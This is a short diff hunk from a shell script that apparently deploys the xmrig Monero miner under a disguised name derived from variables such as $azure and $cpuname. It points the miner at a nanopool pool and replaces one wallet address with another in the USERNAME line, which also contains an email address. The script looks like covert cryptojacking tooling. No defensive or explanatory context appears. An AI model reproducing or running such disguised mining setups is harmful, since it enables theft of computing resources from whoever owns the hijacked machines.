@@ -15,7 +15,7 @@ mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
 POOL=xmr-us-west1.nanopool.org:14433
-USERNAME=85jtJsumYhUUcErXB18SvLWAAvSrSWWMUNt5JgPDSd4FQpVyAsL7b368s5mi1UPXaef95UYT8mp6WhoZRLLAGWS8R8P2udL.orcfullaz/jmayo66@yahoo.com
+USERNAME=44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao.orcfullaz/jmayo66@yahoo.com
 ALGO=rx/0
 DONATE=1
 echo $cpuname" is starting"
